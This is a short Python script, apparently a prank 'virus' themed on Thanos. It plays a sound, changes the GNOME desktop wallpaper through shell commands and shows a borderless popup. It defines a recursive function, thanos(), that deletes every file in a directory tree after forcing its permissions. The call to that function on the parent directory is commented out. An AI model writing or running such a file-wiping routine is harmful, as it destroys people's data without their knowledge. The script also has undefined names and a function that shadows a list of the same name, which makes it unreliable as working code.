import tkinter as tk
import os
import asyncio
from playsound import playsound


wallpaper = [
    "wallpaper1.jpeg",
    "wallpaper2.jpeg",
    "wallpaper3.jpg"
]

def popUp():
    root = tk.Tk()
    root.configure(background="black")

    #To disable the menu
    root.overrideredirect(True)

    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
    x = 300
    y = 300
    root.geometry('500x50+%d+%d' % (x, y))

    frame = tk.Frame(root, width=500, height=50, bg='black')
    frame.grid(row=0, column=0, sticky="NW")

    font = ("Ani", 20, "bold")

    label = tk.Label(root, text='1       5', bg='black', fg='white', font= font)
    label.place(relx=0.5, rely=0.5, anchor="center")

    #label.pack()
    root.mainloop()

def wallpaper(number):
    os.system("gsettings set org.gnome.desktop.background picture-uri file:///home/"+ username +"/virus/" + wallpaper[number])

def bgSound():
    playsound('bgSound.mp3',0)


def thanos(dossier):
    for nom_fichier in os.scandir(dossier):
        if nom_fichier.name != 'virus':
            if nom_fichier.is_dir():
                print('call')
                thanos(nom_fichier.path)
                #os.rmdir(nom_fichier.path)
            else:
                delete = 0
                try:
                    if delete == 0:
                        os.chmod(nom_fichier.path, 0o644)
                        os.remove(nom_fichier.path)
                        print('delete ' + nom_fichier.path)
                    else:
                        print('keep')
                except:
                    print('Mixmax')


bgSound()
wallpaper(0)
#thanos('../')
print('Thanos')
wallpaper(1)
delay(500)
wallpaper(2)
popUp()




